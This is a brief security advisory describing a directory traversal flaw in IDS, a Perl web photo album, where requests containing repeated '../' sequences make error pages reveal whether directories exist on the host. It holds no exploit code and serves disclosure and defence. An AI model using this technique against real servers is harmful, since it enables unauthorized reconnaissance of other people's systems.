IDS (Image Display System) is an web based photo album application written in Perl. IDS is freely available and is maintained by Ashley M. Kirchner.

Users can confirm the existence and location of various directories residing on the IDS host. This is accomplished when a request for a directory and album name is sent to the host containing numerous '../' character sequences. The error page returned will indicate to the attacker whether the specified path is a valid directory or not.
